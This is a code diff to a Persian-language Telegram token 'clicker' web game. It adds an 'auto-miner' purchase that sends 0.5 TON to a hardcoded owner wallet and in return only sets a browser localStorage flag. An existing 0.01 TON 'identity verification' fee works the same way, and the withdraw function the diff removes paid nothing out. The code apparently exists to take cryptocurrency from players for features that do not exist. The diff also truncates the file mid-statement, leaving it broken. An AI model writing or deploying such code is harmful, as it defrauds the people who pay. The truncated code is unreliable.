@@ -118,6 +118,18 @@
             margin-top: 8px;
             display: none;
         }
+        .btn-auto-upgrade {
+            background: linear-gradient(135deg, #8338ec, #3a86ff);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 8px;
+        }
         .btn-withdraw {
             background: linear-gradient(135deg, #f77f00, #fcbf49);
             color: #0b132b;
@@ -247,6 +259,9 @@
         <button class="btn-verify" id="verifyBtn" onclick="verifyWalletWithFee()">🛡 تایید هویت کیف پول (0.01 TON)</button>
         <button class="btn-verified-done" id="verifiedDoneBtn">تایید هویت شده ✅ (ضریب 2x)</button>
 
+        <!-- دکمه خرید جمع‌کننده خودکار -->
+        <button class="btn-auto-upgrade" onclick="buyAutoMiner()">⚡️ خرید جمع‌کننده خودکار (0.5 TON)</button>
+
         <div class="holding-box">
             <span id="holdingStatus">💎 سطح هولد: عادی (ضریب 1x)</span><br>
             <span id="holdingBonus" style="color: #34d399; font-size: 10px;">ابتدا تایید هویت را انجام دهید.</span>
@@ -277,7 +292,7 @@
         </div>
 
         <div class="task-box">
-            <span id="refTitle" style="font-weight: bold; color: #fbbf24; font-size: 11px;">👥 دعوت از دوستان (۵۰۰ توکن)</span><br>
+            <span id="refTitle" style="font-weight: bold; color: #fbbf24; font-size: 11px;">👥 دعوت از دوستان (+۵۰۰ توکن)</span><br>
             <button class="btn-main" style="margin-top: 6px; font-size: 12px; padding: 6px;" onclick="getRefLink()">دریافت لینک دعوت</button>
             
             <div style="margin-top: 8px; font-weight: bold; font-size: 11px; color: #4cc9f0;">دوستان دعوت‌شده (<span id="friendCount">0</span>):</div>
@@ -301,6 +316,7 @@
         let invitedFriends = [];
 
         const OWNER_WALLET = "UQB8E5UreO3ujV4ArV9AI28kGhznU-9ExPDjn6bQ2v9NJEj1";
+        const ADMIN_TELEGRAM = "BabyGramOfficial"; // آیدی تلگرام شما برای دریافت درخواست‌های برداشت
 
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/tonconnect-manifest.json',
@@ -309,7 +325,6 @@
             }
         });
 
-        // بررسی ذخیره بودن تایید هویت قبلی در حافظه گوشی کاربر
         if (localStorage.getItem('babygram_verified') === 'true') {
             walletVerified = true;
             userHoldingTier = 2;
@@ -360,9 +375,8 @@
 
             try {
                 alert(currentLang === 'fa' ? "لطفاً تراکنش 0.01 TON را در کیف پول خود تایید کنید." : "Please confirm transaction.");
-                const result = await tonConnectUI.sendTransaction(transaction);
+                await tonConnectUI.sendTransaction(transaction);
                 
-                // ثبت دائمی تایید هویت در حافظه مرورگر
                 walletVerified = true;
                 userHoldingTier = 2;
                 localStorage.setItem('babygram_verified', 'true');
@@ -372,9 +386,38 @@
                 document.getElementById('holdingStatus').innerText = "💎 سطح هولد: تایید شده (ضریب 2x)";
                 document.getElementById('holdingBonus').innerText = "تایید هویت موفقیت‌آمیز بود! 🎉";
                 updateUI();
-                alert(currentLang === 'fa' ? "تایید هویت با موفقیت انجام شد و دکمه حذف گردید!" : "Verification successful!");
+                alert(currentLang === 'fa' ? "تایید هویت با موفقیت انجام شد!" : "Verification successful!");
             } catch (error) {
                 console.error("Transaction rejected:", error);
+                alert(currentLang === 'fa' ? "تراکنش لغو شد یا موجودی کافی نیست." : "Transaction cancelled.");
+            }
+        }
+
+        async function buyAutoMiner() {
+            if (!tonConnectUI.connected) {
+                alert(currentLang === 'fa' ? "لطفاً ابتدا کیف پول خود را متصل کنید!" : "Please connect your wallet first!");
+                connectWallet();
+                return;
+            }
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [
+                    {
+                        address: OWNER_WALLET,
+                        amount: "500000000" // 0.5 TON
+                    }
+                ]
+            };
+
+            try {
+                alert(currentLang === 'fa' ? "تراکنش 0.5 TON برای فعال‌سازی جمع‌کننده خودکار را تایید کنید." : "Confirm 0.5 TON transaction.");
+                await tonConnectUI.sendTransaction(transaction);
+                
+                localStorage.setItem('babygram_autominer', 'true');
+                alert(currentLang === 'fa' ? "جمع‌کننده خودکار با موفقیت فعال شد! 🎉" : "Auto-miner activated successfully!");
+            } catch (error) {
+                console.error("Auto miner transaction rejected:", error);
                 alert(currentLang === 'fa' ? "تراکنش لغو شد یا موجودی کافی نیست." : "Transaction cancelled.");
             }
         }
@@ -472,40 +515,6 @@
             window.open("https://t.me/babyGramhub", "_blank");
             setTimeout(() => {
                 channelJoined = true;
-                userBalance += 500;
+                userBalance += 500; // پاداش عضویت در کانال ۵۰۰ توکن
                 let btn = document.getElementById('channelBtn');
-                btn.innerText = "انجام شد ✅";
-                btn.classList.add('done');
-                updateUI();
-            }, 2000);
-        }
-
-        function getRefLink() {
-            const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-            const userId = tgUser ? tgUser.id : "12345"; 
-            let refLink = `https://t.me/BabyGramClicker_bot?start=ref_${userId}`;
-            window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent("بیار توکن بی بی گرام بگیریم! 💎🚀")}`, '_blank');
-        }
-
-        function withdrawTokens() {
-            if (!walletConnected) {
-                alert("لطفاً کیف پول را متصل کنید!");
-                return;
-            }
-            if (userBalance < 10000) {
-                alert("حداقل موجودی برای برداشت ۱۰,۰۰۰ توکن است!");
-                return;
-            }
-            alert("درخواست برداشت ثبت شد. تراکنش بلاک‌چین بررسی می‌شود.");
-            userBalance = 0;
-            updateUI();
-        }
-
-        function toggleLanguage() {
-            currentLang = currentLang === 'fa' ? 'en' : 'fa';
-            document.getElementById('htmlTag').dir = currentLang === 'fa' ? 'rtl' : 'ltr';
-            document.getElementById('langBtn').innerText = currentLang === 'fa' ? 'EN' : 'FA';
-        }
-    </script>
-</body>
-</html>
+                btn.
